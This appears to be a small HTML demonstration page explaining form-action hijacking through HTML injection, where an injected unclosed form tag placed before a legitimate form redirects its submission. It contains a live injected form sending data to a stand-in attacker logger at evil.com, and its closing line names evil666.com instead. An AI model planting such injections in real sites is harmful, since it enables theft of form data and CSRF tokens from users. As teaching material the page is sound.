<!-- if we have a possibility for injection - we can override form action by injection a form tag before the legitimate form -->
<!-- especially useful when autocomplete sets some values by dfault -->
<html>
Suppose the attacker was able to inject &quot;&gt;&lt;form action="some_attackers_controlled_url"&gt;<br>
Then the default action of the legal form will be changed to the first encountered value and the data will go wherever attacker specify<br>
This can also be dangerous as CSRF token might be submitted too if an attacker directs form submission to a valid action on the same site<br>
<!-- injection goes here -->
<form action="http://evil.com/logger.php">
<input type="submit"><br>
end of injected code<br>
<br>

<form action="http://legal.com/account.php" method="POST">
This is a legitimate form and a legitimate submit button<br>
<input value="test" name="somevalue"><br>
<input type="submit"><br>
end of the legitimate form 
</form><br>
but the request will go to evil666.com when you click any of buttons
